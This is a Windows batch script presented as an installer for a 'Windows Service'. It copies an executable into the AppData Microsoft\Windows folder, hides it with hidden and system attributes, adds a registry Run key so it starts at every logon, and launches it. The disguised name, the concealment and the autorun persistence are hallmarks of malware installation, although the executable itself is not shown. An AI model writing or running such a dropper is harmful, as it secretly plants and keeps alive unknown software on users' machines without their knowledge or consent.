@echo off
echo Installing Windows Service...

copy "WindowsService.exe" "%appdata%\Microsoft\Windows\"
attrib +h +s "%appdata%\Microsoft\Windows\WindowsService.exe"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "%appdata%\Microsoft\Windows\WindowsService.exe" /f

echo Starting service...
start "" "%appdata%\Microsoft\Windows\WindowsService.exe"

echo Installation complete!
timeout /t 3 >nul